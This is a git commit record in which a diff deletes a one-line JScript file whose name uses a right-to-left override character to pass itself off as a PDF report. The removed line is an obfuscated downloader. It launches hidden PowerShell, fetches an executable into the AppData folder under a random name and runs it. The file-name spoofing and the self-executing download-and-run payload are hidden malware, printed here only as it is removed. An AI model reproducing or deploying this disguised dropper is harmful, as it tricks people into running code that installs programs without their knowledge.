d13c29a0c6156263ce90ca28841b6b4e43c201c5
heryon33 <mariadellacroce7@gmail.com>
2024-10-29 13:53:34 +0000

    Delete Report‮fdp.js

--- Report‮fdp.js
+++
@@ -1,1 +0,0 @@
-  new  ActiveXObject("WScRIPt.sHeLl").RUn(  '"poWErSHELl.EXe"   	iNVoKE-WEBrEQUeSt 	-uRI 	”https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe”  -outFIle ”$EnV:apPDATa\dfwesfwefwefwe32.exe” 	; 	InVOkE-IteM  ”$EnV:aPpdaTA\dfwesfwefwefwe32.exe”'  ,  0  )  ;
